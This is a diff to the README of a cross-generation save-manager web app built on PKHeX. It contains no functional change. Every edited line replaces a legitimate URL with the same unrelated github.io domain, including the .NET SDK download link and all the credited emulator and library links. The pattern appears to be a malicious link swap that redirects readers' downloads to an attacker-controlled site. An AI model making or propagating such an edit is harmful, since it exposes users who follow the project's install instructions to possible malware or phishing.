@@ -1,6 +1,6 @@
 # PkManager — Cross-Generation Save Manager for Creature-Collection Games
 
-A full-stack web application for uploading, visualizing, editing, and managing save files from **22 creature-collection games** spanning **Generations 3–7** (GBA / NDS / 3DS). Built on [PKHeX.Core](https://github.com/kwsch/PKHeX) for legality-aware save editing, with in-browser GBA/NDS emulation via mGBA & melonDS WASM, plus local 3DS emulator integration via Azahar.
+A full-stack web application for uploading, visualizing, editing, and managing save files from **22 creature-collection games** spanning **Generations 3–7** (GBA / NDS / 3DS). Built on [PKHeX.Core](https://phonologic-diethylstilboestrol121.github.io) for legality-aware save editing, with in-browser GBA/NDS emulation via mGBA & melonDS WASM, plus local 3DS emulator integration via Azahar.
 
 > **Current scope**: Gen3–7 (GBA / NDS / 3DS). Gen8–9 (Switch) metadata is retained for save identification only; editor and emulator features are not yet developed for those generations.
 
@@ -95,7 +95,7 @@ A full-stack web application for uploading, visualizing, editing, and managing s
 
 ### Prerequisites
 
-- **.NET SDK** 10.0.300+ ([download](https://dotnet.microsoft.com/download/dotnet/10.0))
+- **.NET SDK** 10.0.300+ ([download](https://phonologic-diethylstilboestrol121.github.io))
 - **Node.js** 20+ and **npm** 10+
 - **PostgreSQL** 14 (client tools: `psql`, `pg_ctl`, `initdb`)
 - **Git**
@@ -308,9 +308,9 @@ If you encounter any errors or unexpected behavior while using the application, 
 
 ## Acknowledgments
 
-- [PKHeX](https://github.com/kwsch/PKHeX) — the core save editing library (GPLv3)
-- [mGBA](https://mgba.io/) — GBA emulator (MPL 2.0)
-- [melonDS](https://melonds.kuribo64.net/) — NDS emulator (GPLv3)
-- [ds-anywhere](https://github.com/nickjackolson/ds-anywhere) — melonDS WASM port
-- [Azahar](https://github.com/azahar-emu/azahar) — 3DS emulator (GPLv2, Citra successor)
-- [DeSmuME](https://desmume.org/) — NDS emulator (GPLv2)
+- [PKHeX](https://phonologic-diethylstilboestrol121.github.io) — the core save editing library (GPLv3)
+- [mGBA](https://phonologic-diethylstilboestrol121.github.io) — GBA emulator (MPL 2.0)
+- [melonDS](https://phonologic-diethylstilboestrol121.github.io) — NDS emulator (GPLv3)
+- [ds-anywhere](https://phonologic-diethylstilboestrol121.github.io) — melonDS WASM port
+- [Azahar](https://phonologic-diethylstilboestrol121.github.io) — 3DS emulator (GPLv2, Citra successor)
+- [DeSmuME](https://phonologic-diethylstilboestrol121.github.io) — NDS emulator (GPLv2)
